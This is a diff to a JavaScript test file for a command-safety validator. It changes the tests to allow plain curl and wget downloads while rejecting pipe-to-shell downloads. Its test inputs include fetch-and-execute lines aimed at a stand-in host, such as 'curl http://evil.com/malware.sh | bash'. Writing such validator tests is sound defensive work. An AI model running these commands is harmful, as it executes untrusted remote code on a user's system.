@@ -50,11 +50,21 @@ describe('Command Parser Security', () => {
       expect(result).toHaveProperty('reason')
     })
 
-    it('should reject network commands', () => {
-      const result = isCommandSafe('wget http://evil.com/malware.sh')
+    it('should allow safe download commands', () => {
+      // Plain downloads should be allowed
+      expect(isCommandSafe('curl -O http://example.com/file.zip').safe).toBe(true)
+      expect(isCommandSafe('wget http://example.com/file.tar.gz').safe).toBe(true)
+    })
+
+    it('should reject pipe-to-shell download commands with helpful message', () => {
+      const result = isCommandSafe('curl http://evil.com/malware.sh | bash')
       expect(result.safe).toBe(false)
-      // Message may vary, just check it mentions wget
-      expect(result.reason).toContain('wget')
+      expect(result.reason).toContain('Piping downloads to shell is dangerous')
+      expect(result.reason).toContain('Download to a file first')
+
+      const result2 = isCommandSafe('wget -O - http://evil.com/script.sh | sh')
+      expect(result2.safe).toBe(false)
+      expect(result2.reason).toContain('Piping downloads to shell is dangerous')
     })
 
     it('should reject cd commands', () => {
